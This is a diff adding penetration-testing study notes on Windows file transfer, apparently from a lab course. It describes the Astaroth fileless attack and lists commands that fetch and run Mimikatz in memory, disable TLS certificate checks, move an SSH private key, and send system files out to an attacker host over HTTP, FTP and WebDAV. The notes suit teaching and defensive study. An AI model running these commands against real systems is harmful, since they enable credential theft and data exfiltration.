@@ -25,3 +25,237 @@ During penetration testing, it's crucial to understand different methods to tran
 - **SMB**: Works on port 445, can be useful when FTP is blocked.
 - **Impacket Tools**: Useful for SMB and other file-sharing methods.
 
+# Windows file transfer methods
+
+The Windows operating system has evolved with new utilities for file transfer operations, which are crucial for both attackers and defenders. Attackers use various methods to transfer files and avoid detection, while defenders need to understand these methods to monitor and create policies to prevent compromises. The Microsoft Astaroth Attack blog post is a prime example of an advanced persistent threat (APT). Fileless threats, as discussed in the blog, use legitimate system tools to execute attacks without leaving traditional file traces. In the Astaroth attack, a spear-phishing email with a malicious link led to an LNK file. When executed, this LNK file used the WMIC tool with the “/Format” parameter to download and run malicious JavaScript code, which then downloaded payloads using the Bitsadmin tool. These payloads were base64-encoded and decoded with the Certutil tool, resulting in DLL files. The regsvr32 tool loaded one of these DLLs, which decrypted and loaded additional files until the final payload, Astaroth, was injected into the Userinit process.
+
+## Download Operations
+
+### PowerShell Base64 Encode & Decode
+__Check SSH Key MD5 Hash__
+```
+ md5sum id_rsa
+```
+__Encode SSH Key to Base64__
+```
+cat id_rsa |base64 -w 0;echo
+```
+we copy the output and paste into powershell in target machine and decode it
+```
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("G1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
+```
+we confirm the tranfer by comparing the hashes 
+```
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+```
+## PowerShell Web Downloads
+
+Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe)
+
+PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. 
+![image](https://github.com/user-attachments/assets/4baaa31a-5b4e-4513-bafc-fc2ea19c3c2b)
+
+__PowerShell DownloadFile Method__
+```
+PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
+```
+__PowerShell DownloadString - Fileless Method__
+PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX
+```
+PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
+IEX pipeline input
+```
+PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+```
+
+__PowerShell Invoke-WebRequest__
+From powershell 3.0 you can use Invoke-WebRequest but is slower. Use iwr,cur,and wget.
+```
+PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+```
+There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.
+This can be bypassed using the parameter -UseBasicParsing.
+```
+PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+
+Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+__If certificate is not trusted related to SSL/TLS.__
+```
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+```
+Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
+relationship for the SSL/TLS secure channel."
+At line:1 char:1
++ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+```
+PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+```
+### SMB Downloads
+__SMB server setup__
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+To download file from SMB server 
+```
+C:\htb> copy \\192.168.220.133\share\nc.exe
+```
+New versions of windows block unauthenticated access use this instead
+use a user and password server
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+__Mount the SMB Server with Username and Password__
+```
+C:\htb> net use n: \\192.168.220.133\share /user:test test
+C:\htb> copy n:\nc.exe
+```
+### FTP Downloads
+FTP client or PowerShell Net.WebClient to download files from an FTP server.
+__Install pyftpdlib__
+```
+sudo pip3 install pyftpdlib
+```
+__Setup__
+```
+sudo python3 -m pyftpdlib --port 21
+```
+__Transfer files__
+```
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+If the shell is non interactive use the methods below
+Create a Command File for the FTP Client and Download the Target File
+```
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo GET file.txt >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\htb>more file.txt
+This is a test file
+```
+## Upload Operations
+There are also situations such as password cracking, analysis, exfiltration, etc., where we must upload files from our target machine into our attack host.
+
+### PowerShell Base64 Encode & Decode
+__Encode File Using PowerShell__
+```
+[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+```
+Copy the output and get the hash as well. For comparison later on.
+```
+Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+```
+
+__Decode Base64 on linux__
+
+```
+echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDU | base64 -d > hosts
+```
+compare hash
+```
+md5sum hosts
+```
+### Powershell web uploads
+ use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We need webserver to upload it to.
+ __Install web server__
+```
+pip3 install uploadserver
+python3 -m uploadserver
+```
+Use PowerShell script PSUpload.ps1 which uses Invoke-RestMethod to perform the upload operations. The script accepts two parameters -File, which we use to specify the file path, and -Uri, the server URL where we'll upload our file.
+```
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+
+Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+__PowerShell Base64 Web Upload__
+PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat.
+```
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+
+We catch the webrequest and decode the base64 and convert it into file 
+```
+nc -lvnp 8000
+```
+```
+echo <base64> | base64 -d -w 0 > hosts
+```
+
+### SMB uploads
+Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.
+
+An alternative is to run SMB over HTTP with WebDav. WebDAV (RFC 4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
+
+__Install WebDav__
+```
+sudo pip3 install wsgidav cheroot
+```
+__Using webdav__
+```
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+__Connect to webdav share__
+```
+C:\htb> dir \\192.168.49.128\DavWWWRoot
+```
+__DavWWWRoot__ is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
+__Uploading to SMB__
+```
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+```
+If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
+
+### FTP Uploads
+Setup FTP  server with (--write) to allow clients to upload files.
+```
+sudo python3 -m pyftpdlib --port 21 --write
+```
+__Use powershell to upload file__
+```
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+__Create a Command File for the FTP Client to Upload a File__
+```
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
